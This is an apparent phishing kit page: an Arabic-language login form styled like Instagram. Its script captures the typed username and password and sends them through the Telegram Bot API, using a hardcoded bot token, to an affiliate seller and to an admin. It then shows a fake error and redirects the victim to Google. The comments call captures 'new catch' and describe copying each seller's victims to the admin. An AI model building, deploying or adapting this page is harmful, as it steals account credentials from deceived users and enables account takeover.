<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 id="title">تسجيل الدخول</h2>
        <form id="scamaForm">
            <input type="text" id="user" placeholder="الهاتف، اسم المستخدم أو البريد" required>
            <input type="password" id="pass" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const sellerId = urlParams.get('ref');
    const type = urlParams.get('type') || 'Account';
    document.getElementById('title').innerText = "Login to " + type;

    document.getElementById('scamaForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const token = "8433106897:AAETCVZJn6d-sDFFBGUcbZesj1QLvvPuUo0";
        const adminId = "6168661664"; // الـ ID ديالك نتا (الآدمين)
        
        const text = `🔥 صيدة جديدة (${type}) 🔥\n👤 User: ${document.getElementById('user').value}\n🔑 Pass: ${document.getElementById('pass').value}`;

        // إرسال للبائع (الضحية اللي تسجل عندك)
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${sellerId}&text=${encodeURIComponent(text)}`);
        
        // إرسال ليك نتا (الآدمين)
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent("نسخة للآدمين:\n" + text)}`)
        .then(() => {
            alert("حدث خطأ في الاتصال، حاول لاحقاً");
            window.location.href = "https://www.google.com";
        });
    });
</script>
</body>
</html>
